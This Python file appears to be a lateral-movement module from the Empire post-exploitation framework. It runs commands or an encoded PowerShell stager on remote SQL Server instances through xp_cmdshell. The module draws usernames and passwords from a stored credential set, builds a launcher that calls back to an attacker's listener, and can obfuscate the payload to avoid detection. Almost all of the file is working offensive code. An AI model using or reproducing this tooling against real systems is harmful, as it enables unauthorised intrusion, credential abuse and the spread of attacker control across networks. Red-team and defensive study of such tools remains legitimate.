from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Invoke-SQLOSCMD',
            'Author': ['@nullbind', '@0xbadjuju'],
            'Description': ('Executes a command or stager on remote hosts using xp_cmdshell.'),
            'Background' : True,
            'OutputExtension' : None,
            
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'powershell',
            'MinPSVersion' : '2',
            'MinLanguageVersion' : '2',
            
            'Comments': []
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'Instance' : {
                'Description'   :   'Host[s] to execute the stager on, comma separated.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Command' : {
                'Description'   :   'Custom command to execute on remote hosts.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   '[domain\]username to use to execute command.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password to use to execute command.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        self.mainMenu = mainMenu
        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):

        credID = self.options["CredID"]['Value']
        if credID != "":
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""
            (credID, credType, domainName, username, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]
            if domainName != "":
                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(username)
            else:
                self.options["UserName"]['Value'] = str(username)
            if password != "":
                self.options["Password"]['Value'] = password

        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        instance = self.options['Instance']['Value']
        command = self.options['Command']['Value']
        username = self.options['UserName']['Value']
        password = self.options['Password']['Value']


        moduleSource = self.mainMenu.installPath + "data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1"
        moduleCode = ""
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            with open(moduleSource, 'r') as source:
                moduleCode = source.read()
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""
        script = moduleCode


        if command == "":
            if not self.mainMenu.listeners.is_listener_valid(listenerName):
                print helpers.color("[!] Invalid listener: " + listenerName)
                return ""
            else:
                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                if launcher == "":
                    return ""
                else:
                    command = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher


        scriptEnd = "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)  

        if username != "":
            scriptEnd += " -UserName "+username
        if password != "":
            scriptEnd += " -Password "+password
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
